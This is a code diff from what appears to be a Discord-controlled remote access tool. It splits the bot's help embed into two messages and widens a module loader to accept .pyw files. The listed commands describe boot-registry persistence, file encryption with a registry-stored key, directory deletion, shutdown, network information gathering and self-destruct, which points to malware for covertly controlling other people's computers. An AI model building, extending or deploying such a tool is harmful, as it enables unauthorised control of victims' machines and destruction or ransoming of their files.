@@ -76,14 +76,17 @@ async def on_message(message):
         embed.add_field(name=".setup", value="RUN BEFORE USING ENCRYPTION METHODS! Inserts itself into boot registry, creates an encryption key and stores it into the registry.", inline=False)
         embed.add_field(name=".encrypt", value="Encrypt file [WIP]", inline=False)
         embed.add_field(name=".decrypt", value="Decrypt file [WIP]", inline=False)
-        embed.add_field(name=".selfdestruct", value="Self destruct.", inline=False)
-        embed.add_field(name=".shutdown", value="Shutdown the computer.", inline=False)
-        embed.add_field(name=".deletedir", value="Deletes a specified directory. Usage: ``.deletedir <target_folder>``", inline=False)
-        embed.add_field(name=".createdir", value="Creates a specified directory. Usage: ``.createdir <folder_path>˙", inline=False)
-        embed.add_field(name=".networking", value="Gets networking information.", inline=False)
-        embed.add_field(name=".monitor", value="Turns the monitor on/off. Usage: ``.monitor <on/off>``", inline=False)
+
+        embed2 = discord.Embed(title="Command list", description="", color=0x00ff00)
+        embed2.add_field(name=".selfdestruct", value="Self destruct.", inline=False)
+        embed2.add_field(name=".shutdown", value="Shutdown the computer.", inline=False)
+        embed2.add_field(name=".deletedir", value="Deletes a specified directory. Usage: ``.deletedir <target_folder>``", inline=False)
+        embed2.add_field(name=".createdir", value="Creates a specified directory. Usage: ``.createdir <folder_path>˙", inline=False)
+        embed2.add_field(name=".networking", value="Gets networking information.", inline=False)
+        embed2.add_field(name=".monitor", value="Turns the monitor on/off. Usage: ``.monitor <on/off>``", inline=False)
         try:
             await message.channel.send(embed=embed)
+            await message.channel.send(embed=embed2)
         except Exception as e:
             print(e)
             await message.channel.send("Embed failed, try again.")
@@ -359,7 +362,7 @@ async def on_message(message):
         elif arg == "load":
             try:
                 module = message.content.split(" ")[2]
-                if module != "" and module.endswith(".py"):
+                if module != "" and module.endswith(".py") or module.endswith(".pyw"):
                     load_module(module)
                     embed = discord.Embed(title="Module Loader", description=f"Module {module} loaded.", color=0x00ff00)
                 elif module == "all":
